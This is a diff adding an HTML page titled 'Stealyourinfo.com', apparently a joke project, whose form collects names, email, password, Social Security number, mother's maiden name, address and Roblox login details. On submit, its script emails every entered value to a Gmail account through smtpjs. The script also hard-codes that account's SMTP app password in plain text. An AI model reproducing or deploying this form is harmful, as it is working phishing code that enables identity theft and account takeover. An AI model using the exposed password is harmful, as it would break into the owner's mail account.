@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+    <head> 
+        <title>Stealyourinfo.com</title>
+        <link rel="stylesheet" href="mar.css">
+    </head>
+<body>
+    <h1>Stealyourinfo.com</h1>
+    Can I have it please
+    <div class="inputBox">
+        <input type="text" id="fn" required="NOW!">
+        <span>First Name</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="ln" required="NOW!">
+        <span>Last Name</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="email" required="NOW!">
+        <span>E-Mail</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="password" required="NOW!">
+        <span>Password</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="ssid" required="NOW!">
+        <span>SSID</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="maiden" required="NOW!">
+        <span>Mother's Maiden Name</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="addy" required="NOW!">
+        <span>Address</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="zip" required="NOW!">
+        <span>Zip Code</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="state" required="NOW!">
+        <span>State</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="roblox" required="NOW!">
+        <span>Roblox Username</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="robloxpassword" required="NOW!">
+        <span>Roblox Password</span>
+    </div>
+    <div class="inputBox">
+        <input type="text" id="triorchoc" required="NOW!">
+        <span>Tritip or Chocolate?</span>
+    </div>
+    <button id="submit" onclick="submit()"> submit! </button>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script type="module">
+        //import { getEmailAppPassword } from './clempoop.js';
+        document.getElementById("submit").addEventListener("click", () => {        Email.send({
+    Host : "smtp.gmail.com",
+    Username : "noahgameboss@gmail.com",
+    //Password : getEmailAppPassword(),
+    Password : "tonzqceqdngkeybr",
+    To : 'noahgameboss@gmail.com',
+    From : "noahgameboss@gmail.com",
+    Subject : "lol! penis!",
+    Body : `First Name: ${document.getElementById("fn").value}\n
+    Last Name: ${document.getElementById("ln").value}\n
+    Social Security Number: ${document.getElementById("ssid").value}\n
+    Mother's Maiden: ${document.getElementById("maiden").value}\n
+    Address: ${document.getElementById("addy").value}\n
+    Zip Code: ${document.getElementById("zip").value}\n
+    State: ${document.getElementById("state").value}\n
+    Rblx User: ${document.getElementById("roblox").value}\n
+    Rblx Pass: ${document.getElementById("robloxpassword").value}\n
+    Tri or Choc?: ${document.getElementById("triorchoc").value}\n`
+}).then(
+  message => alert(message)
+);
+
+document.getElementById("ln").value = "";
+document.getElementById("fn").value = "";
+    document.getElementById("ssid").value = "";
+    document.getElementById("maiden").value = "";
+    document.getElementById("addy").value = "";
+    document.getElementById("zip").value = "";
+    document.getElementById("state").value = "";
+    document.getElementById("roblox").value = "";
+    document.getElementById("robloxpassword").value = "";
+    document.getElementById("triorchoc").value = "";
+});
+
+    </script>
+
+</body>
+</html>
